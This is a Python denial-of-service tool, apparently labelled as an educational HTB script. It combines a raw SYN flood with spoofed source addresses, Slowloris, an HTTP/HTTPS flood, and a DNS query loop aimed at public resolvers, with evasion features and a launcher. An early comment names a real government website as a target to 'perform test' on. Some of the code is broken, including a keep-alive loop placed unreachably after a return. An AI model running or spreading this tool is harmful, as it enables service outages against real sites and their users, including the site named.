#!/usr/bin/env python3
"""
Complex DOS Attack Script
Author: HTB
Description: Advanced DOS attack with evasion techniques, IP spoofing, and raw packet manipulation
Educational Purpose Only - Use responsibly and legally
Requires root privileges for raw socket operations
"""
# It can send Packets Remotely https://ahsec.assam.gov.in perform test in that 
import socket
import sys
import time
import random
import threading
import struct
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import os
import urllib.parse
import ssl

class ComplexDOS:
    def __init__(self, target, target_port=None):
        self.target_url = None
        self.target_ip = None
        self.target_port = None
        self.target_path = '/'
        self.use_https = False
        self.target_host = None
        
        # Parse target (URL or IP)
        self._parse_target(target, target_port)
        
        self.packets_sent = 0
        self.running = True
        self.source_ips = self.generate_source_ips()
        
        # Check for root privileges
        if os.geteuid() != 0:
            print("[!] WARNING: This script requires root privileges for full functionality")
    
    def _parse_target(self, target, port):
        """Parse target URL or IP address"""
        if target.startswith('http://') or target.startswith('https://'):
            # It's a URL
            self.target_url = target
            parsed = urllib.parse.urlparse(target)
            self.target_host = parsed.hostname
            self.target_ip = socket.gethostbyname(parsed.hostname)
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.target_path = parsed.path or '/'
            self.use_https = parsed.scheme == 'https'
            print(f"[*] Parsed URL: {self.target_host}:{self.target_port} (IP: {self.target_ip})")
        else:
            # It's an IP address
            self.target_ip = target
            self.target_port = port or 80
            self.target_host = target
            self.use_https = self.target_port == 443
            print(f"[*] Target IP: {self.target_ip}:{self.target_port}")
    
    def generate_source_ips(self):
        """Generate random source IP addresses for spoofing"""
        source_ips = []
        
        # RFC 1918 private IP ranges for safe spoofing
        private_ranges = [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16'
        ]
        
        for range_str in private_ranges:
            network = ipaddress.IPv4Network(range_str)
            for _ in range(50):  # Generate 50 IPs per range
                random_ip = network.network_address + random.randint(1, network.num_addresses - 2)
                source_ips.append(str(random_ip))
        
        return source_ips
    
    def calculate_checksum(self, data):
        """Calculate IP/TCP/UDP checksum"""
        if len(data) % 2:
            data += b'\\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF
    
    def create_ip_header(self, source_ip, dest_ip, protocol):
        """Create IP header for raw packet"""
        version = 4
        ihl = 5
        tos = 0
        total_length = 0  # Will be filled by kernel
        packet_id = random.randint(1, 65535)
        flags = 0
        fragment_offset = 0
        ttl = random.randint(64, 128)  # Random TTL for evasion
        checksum = 0  # Will be calculated later
        
        # Pack IP header
        version_ihl = (version << 4) + ihl
        flags_fragment = (flags << 13) + fragment_offset
        
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               version_ihl, tos, total_length, packet_id,
                               flags_fragment, ttl, protocol, checksum,
                               source, dest)
        
        return ip_header
    
    def create_tcp_header(self, source_port, dest_port, source_ip, dest_ip, syn=True):
        """Create TCP header with SYN flag"""
        sequence = random.randint(0, 4294967295)
        ack_sequence = 0
        data_offset = 5  # TCP header length
        reserved = 0
        
        # TCP flags
        flags = 0
        if syn:
            flags |= 0x02  # SYN flag
        
        window = random.randint(1024, 65535)  # Random window size
        checksum = 0
        urgent_pointer = 0
        
        # Pack TCP header without checksum
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, sequence, ack_sequence,
                                (data_offset << 4) + reserved, flags,
                                window, checksum, urgent_pointer)
        
        # Calculate TCP checksum
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        pseudo_header = struct.pack('!4s4sBBH', source, dest, 0, protocol, tcp_length)
        pseudo_packet = pseudo_header + tcp_header
        
        tcp_checksum = self.calculate_checksum(pseudo_packet)
        
        # Repack with correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, sequence, ack_sequence,
                                (data_offset << 4) + reserved, flags,
                                window, tcp_checksum, urgent_pointer)
        
        return tcp_header
    
    def raw_syn_flood(self, duration=60):
        """Advanced SYN flood with IP spoofing"""
        print("[*] Starting raw SYN flood with IP spoofing...")
        start_time = time.time()
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("[!] Raw socket creation requires root privileges")
            return
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Random source IP and port
                source_ip = random.choice(self.source_ips)
                source_port = random.randint(1024, 65535)
                
                # Create headers
                ip_header = self.create_ip_header(source_ip, self.target_ip, socket.IPPROTO_TCP)
                tcp_header = self.create_tcp_header(source_port, self.target_port, 
                                                  source_ip, self.target_ip, syn=True)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                self.packets_sent += 1
                
            except Exception as e:
                pass
            
            # Random delay for evasion
            time.sleep(random.uniform(0.0001, 0.001))
        
        sock.close()
    
    def slowloris_attack(self, duration=60):
        """Slowloris attack - keeps connections open with URL support"""
        print(f"[*] Starting Slowloris attack on {'HTTPS' if self.use_https else 'HTTP'}...")
        start_time = time.time()
        
        sockets = []
        
        # Initial connection phase
        for _ in range(200):
            try:
                if self.use_https:
                    sock = self._create_https_socket()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.target_port))
                
                if sock:
                    # Send partial HTTP request with proper host header
                    path = f"{self.target_path}?id={random.randint(0, 10000)}"
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += "Accept-Language: en-US,en;q=0.5\r\n"
                    request += "Accept-Encoding: gzip, deflate\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Content-Length: 42\r\n"
                    
                    sock.send(request.encode())
                    sockets.append(sock)
                    self.packets_sent += 1
                
            except Exception as e:
                pass
    
    def _create_https_socket(self):
        """Create HTTPS socket connection"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
            ssl_sock.connect((self.target_ip, self.target_port))
            return ssl_sock
        except:
            return None
        
        # Keep connections alive
        while self.running and (time.time() - start_time) < duration:
            print(f"[+] Slowloris: {len(sockets)} connections active")
            
            for sock in sockets[:]:
                try:
                    # Send keep-alive header
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    sock.send(header.encode())
                except:
                    sockets.remove(sock)
            
            # Add new connections
            for _ in range(50):
                try:
                    if self.use_https:
                        sock = self._create_https_socket()
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((self.target_ip, self.target_port))
                    
                    if sock:
                        path = f"{self.target_path}?keep={random.randint(0, 2000)}"
                        request = f"GET {path} HTTP/1.1\r\n"
                        request += f"Host: {self.target_host}\r\n"
                        sock.send(request.encode())
                        sockets.append(sock)
                        self.packets_sent += 1
                except:
                    pass
            
            time.sleep(15)  # Send keep-alive every 15 seconds
        
        # Clean up connections
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def http_flood_attack(self, duration=60):
        """HTTP/HTTPS flood attack with URL support"""
        print(f"[*] Starting HTTP flood on {'HTTPS' if self.use_https else 'HTTP'}...")
        start_time = time.time()
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        ]
        
        http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        
        while self.running and (time.time() - start_time) < duration:
            try:
                method = random.choice(http_methods)
                user_agent = random.choice(user_agents)
                
                if self.use_https:
                    sock = self._create_https_socket()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((self.target_ip, self.target_port))
                
                if sock:
                    # Generate realistic paths
                    paths = [
                        self.target_path,
                        f"{self.target_path}?id={random.randint(1, 10000)}",
                        f"/search?q={random.choice(['test', 'data', 'info'])}",
                        f"/api/data?token={random.randint(1000, 9999)}"
                    ]
                    
                    path = random.choice(paths)
                    
                    if method == 'POST':
                        post_data = f"data={random.randint(1, 999999)}&token={random.randint(1, 9999)}"
                        request = f"{method} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.target_host}\r\n"
                        request += f"User-Agent: {user_agent}\r\n"
                        request += "Content-Type: application/x-www-form-urlencoded\r\n"
                        request += f"Content-Length: {len(post_data)}\r\n"
                        request += "Connection: close\r\n\r\n"
                        request += post_data
                    else:
                        request = f"{method} {path} HTTP/1.1\r\n"
                        request += f"Host: {self.target_host}\r\n"
                        request += f"User-Agent: {user_agent}\r\n"
                        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        request += "Accept-Language: en-US,en;q=0.5\r\n"
                        request += "Accept-Encoding: gzip, deflate\r\n"
                        request += "Connection: close\r\n\r\n"
                    
                    sock.send(request.encode())
                    # Read response to simulate real browser behavior
                    try:
                        response = sock.recv(1024)
                    except:
                        pass
                    sock.close()
                    self.packets_sent += 1
                
            except Exception as e:
                pass
            
            # Small delay to avoid overwhelming the system
            time.sleep(random.uniform(0.01, 0.05))
    
    def reflection_amplification_attack(self, duration=60):
        """DNS/NTP reflection attack (simulated)"""
        print("[*] Starting reflection amplification attack...")
        start_time = time.time()
        
        # Common open resolvers (for educational purposes - use responsibly)
        dns_servers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '208.67.222.222', '208.67.220.220'
        ]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Create DNS query with spoofed source IP
                transaction_id = random.randint(1, 65535)
                
                # DNS query for ANY record (amplification)
                query = struct.pack('>H', transaction_id)  # Transaction ID
                query += struct.pack('>H', 0x0100)  # Flags: standard query
                query += struct.pack('>H', 1)  # Questions
                query += struct.pack('>H', 0)  # Answer RRs
                query += struct.pack('>H', 0)  # Authority RRs
                query += struct.pack('>H', 0)  # Additional RRs
                
                # Query: version.bind
                query += b'\\x07version\\x04bind\\x00'  # Domain
                query += struct.pack('>H', 16)  # Query type: TXT
                query += struct.pack('>H', 3)   # Query class: CHAOS
                
                # Send to random DNS server
                dns_server = random.choice(dns_servers)
                sock.sendto(query, (dns_server, 53))
                self.packets_sent += 1
                
            except:
                pass
            
            time.sleep(0.01)
        
        sock.close()
    
    def launch_complex_attack(self, attack_types=['syn_flood', 'slowloris'], duration=60, threads=5):
        """Launch complex multi-vector DOS attack with URL support"""
        print(f"[*] Launching complex DOS attack with {len(attack_types)} vectors")
        print(f"[*] Attack duration: {duration} seconds")
        print(f"[*] Threads per attack: {threads}")
        print(f"[*] Target: {'HTTPS' if self.use_https else 'HTTP'} - {self.target_host}:{self.target_port}")
        
        with ThreadPoolExecutor(max_workers=threads * len(attack_types)) as executor:
            futures = []
            
            for attack_type in attack_types:
                for _ in range(threads):
                    if attack_type == 'syn_flood':
                        future = executor.submit(self.raw_syn_flood, duration)
                    elif attack_type == 'slowloris':
                        future = executor.submit(self.slowloris_attack, duration)
                    elif attack_type == 'http_flood':
                        future = executor.submit(self.http_flood_attack, duration)
                    elif attack_type == 'reflection':
                        future = executor.submit(self.reflection_amplification_attack, duration)
                    
                    futures.append(future)
            
            # Progress monitor with evasion
            start_time = time.time()
            while (time.time() - start_time) < duration:
                # Randomize reporting interval for evasion
                sleep_time = random.uniform(3, 8)
                time.sleep(sleep_time)
                print(f"[+] Complex attack: {self.packets_sent} packets sent")
            
            self.running = False
            
            # Wait for completion
            for future in futures:
                future.result()
        
        print(f"[*] Complex attack completed. Total packets sent: {self.packets_sent}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 dos_complex.py <target_url_or_ip> [target_port] [attack_types] [duration] [threads]")
        print("Attack types: syn_flood,slowloris,http_flood,reflection (comma-separated)")
        print("Examples:")
        print("  sudo python3 dos_complex.py https://example.com syn_flood,http_flood 300 8")
        print("  sudo python3 dos_complex.py http://192.168.1.100:8080 slowloris,http_flood 300 8")
        print("  sudo python3 dos_complex.py 192.168.1.100 80 syn_flood,slowloris 300 8")
        print("Note: Requires root privileges for raw socket operations")
        sys.exit(1)
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] WARNING: Many features require root privileges")
        print("[!] Run with: sudo python3 dos_complex.py ...")
    
    target = sys.argv[1]
    
    # Handle different argument patterns
    if target.startswith('http://') or target.startswith('https://'):
        # URL provided
        target_port = None
        attack_types = sys.argv[2].split(',') if len(sys.argv) > 2 else ['http_flood', 'slowloris']
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 120
        threads = int(sys.argv[4]) if len(sys.argv) > 4 else 5
    else:
        # IP provided, need port
        if len(sys.argv) < 3:
            print("Error: Port required when using IP address")
            print("Usage: python3 dos_complex.py <ip_address> <port> [attack_types] [duration] [threads]")
            sys.exit(1)
        target_port = int(sys.argv[2])
        attack_types = sys.argv[3].split(',') if len(sys.argv) > 3 else ['syn_flood', 'slowloris']
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 120
        threads = int(sys.argv[5]) if len(sys.argv) > 5 else 5
    
    print("="*70)
    print("COMPLEX DOS ATTACK TOOL - ADVANCED EVASION WITH URL SUPPORT")
    print("="*70)
    print(f"Target: {target}")
    print(f"Attack types: {', '.join(attack_types)}")
    print(f"Duration: {duration} seconds")
    print(f"Threads per attack: {threads}")
    print("Features: URL support, HTTPS, IP spoofing, evasion techniques, multiple vectors")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*70)
    
    # Confirm attack
    confirm = input("Continue with complex attack? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    dos_attack = ComplexDOS(target, target_port)
    
    try:
        dos_attack.launch_complex_attack(attack_types, duration, threads)
    except KeyboardInterrupt:
        print("\\n[!] Attack interrupted by user")
        dos_attack.running = False

if __name__ == "__main__":
    main()
